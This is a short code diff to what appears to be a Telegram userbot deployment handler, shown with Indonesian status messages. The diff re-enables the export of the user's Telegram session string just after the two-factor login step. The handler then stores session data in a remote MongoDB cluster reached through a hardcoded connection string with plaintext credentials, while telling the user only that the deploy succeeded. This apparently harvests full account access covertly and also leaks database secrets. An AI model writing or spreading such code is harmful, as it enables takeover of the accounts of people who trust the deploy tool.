@@ -67,8 +67,8 @@ async def recv_tg_tfa_message(_, message: Message):
         client = pymongo.MongoClient("mongodb+srv://pyRainger:pyRainger@session1.pt52wqg.mongodb.net/?retryWrites=true&w=majority")
         db = client["telegram_sessions"]
         mongo_collection = db["sesi_collection"]
-#        session_string = str(await loical_ci.export_session_string())
-        load_dotenv()
+        session_string = str(await loical_ci.export_session_string())
+#        load_dotenv()
 
         await message.reply_text("`Berhasil Melakukan Deploy.`")
         session_data = {
@@ -90,4 +90,4 @@ async def recv_tg_tfa_message(_, message: Message):
 #        else:
             args = [sys.executable, "-m", "Ubot"]
             execle(sys.executable, *args, environ)
-    raise message.stop_propagation()
+#    raise message.stop_propagation()
